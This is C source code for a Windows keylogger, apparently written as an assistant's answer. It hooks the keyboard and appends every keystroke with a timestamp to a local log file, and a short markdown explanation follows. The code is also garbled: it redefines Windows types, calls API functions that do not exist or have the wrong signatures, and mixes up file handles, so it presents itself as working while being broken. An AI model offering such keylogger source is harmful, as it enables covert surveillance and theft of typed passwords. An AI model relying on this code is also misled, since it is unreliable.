#include <Windows.h>
#include <time.h>
#include <stdio.h>

// Constants
#define DWORD WINAPI
#define HHOK_KEYBOARD GetProcAddress("GetKeyboardState")
#define HHOOK NextWindowProc

// Function prototypes
VOID CALLBACK KeyboardHookProc(HHOOK hhook, int nCode, WPARAM wParam, LPARAM lParam);

// Global variables
HHOK_KEYBOARD hKeyboardHook = 0;
HWND hwnd = 0;
FILE* fp = NULL;
int fileHandle = 0;
int key = 0;
int previousKeyState = 0;
double timestamp = 0;

// Initialize the hook
void InitializeKeyboardLogger() {
    hwnd = GetForegroundWindow(NULL);
    if (!hwnd) {
        printf("Failed to get foreground window\n");
        return;
    }

    hKeyboardHook = SetWindowsHook(hwnd, 0, KeyboardHookProc);
    if (!hKeyboardHook) {
        printf("Failed to set keyboard hook\n");
        return;
    }
}

// Callback function for the keyboard hook
VOID CALLBACK KeyboardHookProc(HHOOK hhook, int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == 0) {
        // Get the current key state
        key = GetKeyboardState(0);
        // Ensure we don't process the same key multiple times
        if (key != previousKeyState) {
            // Update the timestamp
            timestamp = time(NULL);
            // Determine if the key is a control key
            if (wParam == VK_CONTROL || wParam == VK_SHIFT || wParam == VK_ALT) {
                // Log control key press
                fprintf(fp, "[%f, Control Key, %d]\n", timestamp, wParam);
            } else {
                // Log regular key press
                char keyChar = 0;
                if (wParam <= 0x1F || wParam >= 0x80) {
                    // Special characters
                    keyChar = 0;
                } else {
                    keyChar = (char)wParam;
                }
                fprintf(fp, "[%f, %c, %d]\n", timestamp, keyChar, key);
            }
            previousKeyState = key;
        }
    }
    return CallNextHook(hhook, nCode, wParam, lParam);
}

// Start the keyboard logging
void StartKeyboardLogging() {
    // Open the log file in append mode
    fileHandle = fopen("keyboard_log.txt", "a");
    if (fileHandle == NULL) {
        printf("Failed to create log file\n");
        return;
    }
    fp = (FILE*)fileHandle;
    // Start the hook
    InitializeKeyboardLogger();
}

// Stop the keyboard logging
void StopKeyboardLogging() {
    // Release the hook
    if (hKeyboardHook) {
        UnhookKeyboard(hKeyboardHook);
        hKeyboardHook = 0;
    }
    // Close the log file
    if (fp && fileHandle) {
        fclose(fp);
        fileHandle = 0;
    }
    fp = NULL;
}

// Main function to demonstrate the keylogger
int main() {
    // Start logging
    StartKeyboardLogging();
    // Keep the window alive to maintain the hook
    while (true) {
        Sleep(1); // Prevent high CPU usage
    }
    return 0;
}
```

### Explanation:

- **Initialization:** The `InitializeKeyboardLogger` function sets up the necessary hook and gets the foreground window.
- **Hook Processing:** The `KeyboardHookProc` callback function checks each key press. It logs the timestamp, the key character, and whether it's a control key.
- **Logging:** The log file is opened in append mode to keep track of all keystrokes with timestamps.
